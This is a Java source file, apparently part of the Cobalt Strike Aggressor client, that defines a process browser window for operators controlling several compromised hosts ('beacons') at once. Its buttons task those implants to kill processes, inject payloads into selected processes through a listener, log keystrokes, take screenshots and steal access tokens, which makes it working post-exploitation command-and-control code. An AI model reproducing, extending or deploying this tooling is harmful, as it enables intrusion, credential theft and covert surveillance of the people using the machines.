package aggressor.windows;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.dialogs.ScListenerChooser;
import beacon.TaskBeacon;
import common.AObject;
import common.BeaconEntry;
import common.Callback;
import common.CommonUtils;
import common.ScriptUtils;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Stack;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JPanel;
import javax.swing.JSeparator;

import ui.ATable;
import ui.GenericTableModel;
import ui.TablePopup;

public class ProcessBrowserMulti extends AObject implements ActionListener, TablePopup {
    protected String[] bids = new String[0];

    protected AggressorClient client = null;

    protected LinkedList results = new LinkedList();

    protected ProcessBrowserMulti win = this;

    protected GenericTableModel model = null;

    protected ATable table = null;

    protected String[] cols = {"External", "Internal", "PID", "PPID", "Name", "Arch", "Session", "User"};

    public ProcessBrowserMulti(AggressorClient aggressorClient, String[] arrstring) {
        this.client = aggressorClient;
        this.bids = arrstring;
        this.model = DialogUtils.setupModel("PID", this.cols, new LinkedList());
    }

    public void refresh() {
        this.results = new LinkedList();
        DialogUtils.setTable(this.table, this.model, this.results);
        for (int i = 0; i < this.bids.length; i++) {
            final String bid = this.bids[i];
            this.client.getConnection().call("beacons.task_ps", CommonUtils.args(this.bids[i]), new Callback() {
                public void result(String string, Object object) {
                    win.result(bid, "", object);
                }
            });
        }
    }

    public void actionPerformed(ActionEvent actionEvent) {
        String str = actionEvent.getActionCommand();
        if ("Kill".equals(str)) {
            final Object[][] all = model.getSelectedValuesFromColumns(
                    table, CommonUtils.toArray("PID, Arch, bid"));
            for (int i = 0; i < all.length; i++) {
                TaskBeacon taskBeacon = new TaskBeacon(client, client.getData(),
                        client.getConnection(), new String[]{(String) all[i][2]});
                int num = Integer.parseInt(all[i][0] + "");
                String str1 = all[i][1] + "";
                taskBeacon.input("kill " + num);
                taskBeacon.Kill(num);
                taskBeacon.Pause(500);
            }
            refresh();
        } else if ("Refresh".equals(str)) {
            refresh();
        } else if ("Inject".equals(str)) {
            
            ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                @Override
                public void dialogResult(String string) {
                    Object[][] arrobject = model.getSelectedValuesFromColumns(table, CommonUtils.toArray("PID, Arch, bid"));
                    for (int i = 0; i < arrobject.length; i++) {
                        TaskBeacon taskBeacon = new TaskBeacon(client, client.getData(), client.getConnection(), new String[]{(String) arrobject[i][2]});
                        int num = Integer.parseInt(arrobject[i][0] + "");
                        String str = arrobject[i][1] + "";
                        taskBeacon.input("inject " + num + " " + str + " " + string);
                        taskBeacon.Inject(num, string, str);
                    }
                }
            }).show();
        } else if ("Log Keystrokes".equals(str)) {
            final Object[][] all = this.model.getSelectedValuesFromColumns(table,
                    CommonUtils.toArray("PID, Arch, bid"));
            for (int i = 0; i < all.length; i++) {
                TaskBeacon taskBeacon = new TaskBeacon(this.client, this.client.getData(),
                        this.client.getConnection(), new String[]{(String) all[i][2]});
                int num = Integer.parseInt(all[i][0] + "");
                String str1 = all[i][1] + "";
                taskBeacon.input("keylogger " + num + " " + str1);
                taskBeacon.KeyLogger(num, str1);
            }
            DialogUtils.showInfo("Tasked Beacons to log keystrokes");
        } else if ("Screenshot".equals(str)) {
            final Object[][] all = this.model.getSelectedValuesFromColumns(this.table, CommonUtils.toArray("PID, Arch, bid"));
            SafeDialogs.ask("Take screenshots for X seconds:", "0", new SafeDialogCallback() {
                @Override
                public void dialogResult(String string) {
                    int number = CommonUtils.toNumber(string, 0);
                    for (int i = 0; i < all.length; i++) {
                        TaskBeacon taskBeacon = new TaskBeacon(client, client.getData(), client.getConnection(), new String[]{(String) all[i][2]});
                        int j = Integer.parseInt(all[i][0] + "");
                        String str = all[i][1] + "";
                        taskBeacon.input("screenshot " + j + " " + str + " " + number);
                        taskBeacon.Screenshot(j, str, number);
                    }
                    DialogUtils.showInfo("Tasked Beacons to take screenshots");
                }
            });
        } else if ("Steal Token".equals(str)) {
            final Object[][] all = this.model.getSelectedValuesFromColumns(this.table,
                    CommonUtils.toArray("PID, Arch, bid"));
            for (int i = 0; i < all.length; i++) {
                TaskBeacon taskBeacon = new TaskBeacon(this.client, this.client.getData(),
                        this.client.getConnection(), new String[]{(String) all[i][2]});
                int num = Integer.parseInt(all[i][0] + "");
                taskBeacon.input("steal_token " + num);
                taskBeacon.StealToken(num);
            }
            DialogUtils.showInfo("Tasked Beacons to steal a token");
        }
    }

    public void showPopup(MouseEvent mouseEvent) {
        Stack stack = new Stack();
        stack.push(ScriptUtils.convertAll(this));
        stack.push(ScriptUtils.convertAll(this.model.getSelectedRows(this.table)));
        this.client.getScriptEngine().getMenuBuilder()
                .installMenu(mouseEvent, "processbrowser_multi", stack);
    }

    public JButton Button(String string) {
        JButton jButton = new JButton(string);
        jButton.addActionListener(this);
        return jButton;
    }

    public JComponent getContent() {
        JPanel jPanel = new JPanel();
        jPanel.setLayout(new BorderLayout());
        this.table = DialogUtils.setupTable(this.model, this.cols, true);
        DialogUtils.setTableColumnWidths(this.table,
                DialogUtils.toMap("External: 180, Internal: 180, PID: 60, PPID: 60, Name: 180, Arch: 60, Session: 60, User: 180"));
        this.table.setPopupMenu(this);
        JButton jButton1 = Button("Kill");
        JButton jButton2 = Button("Refresh");
        JSeparator jSeparator1 = new JSeparator();
        JButton jButton3 = Button("Inject");
        JButton jButton4 = Button("Log Keystrokes");
        JButton jButton5 = Button("Screenshot");
        JButton jButton6 = Button("Steal Token");
        JSeparator jSeparator2 = new JSeparator();
        JButton jButton7 = Button("Help");
        jButton7.addActionListener(
                DialogUtils.gotoURL("https://www.cobaltstrike.com/help-process-browser"));
        jPanel.add(DialogUtils.FilterAndScroll(this.table), "Center");
        jPanel.add(DialogUtils.center(jButton1, jButton2, jSeparator1, jButton3, jButton4, jButton5, jButton6, jSeparator2, jButton7), "South");
        refresh();
        return jPanel;
    }

    public void result(String string1, String string2, Object object) {
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.client.getData(), string1);
        if (beaconEntry == null) {
            return;
        }
        String[] arrstring = object.toString().trim().split("\n");
        for (int i = 0; i < arrstring.length; i++) {
            String[] strs1 = arrstring[i].split("\t");
            HashMap hashMap = new HashMap();
            hashMap.put("bid", string1);
            hashMap.put("External", beaconEntry.getExternal());
            hashMap.put("Internal", beaconEntry.getInternal());
            if (strs1.length >= 1)
                hashMap.put("Name", strs1[0]);
            if (strs1.length >= 2)
                hashMap.put("PPID", strs1[1]);
            if (strs1.length >= 3)
                hashMap.put("PID", strs1[2]);
            if (strs1.length >= 4)
                hashMap.put("Arch", strs1[3]);
            if (strs1.length >= 5)
                hashMap.put("User", strs1[4]);
            if (strs1.length >= 6)
                hashMap.put("Session", strs1[5]);
            this.results.add(hashMap);
        }
        DialogUtils.setTable(this.table, this.model, this.results);
    }
}
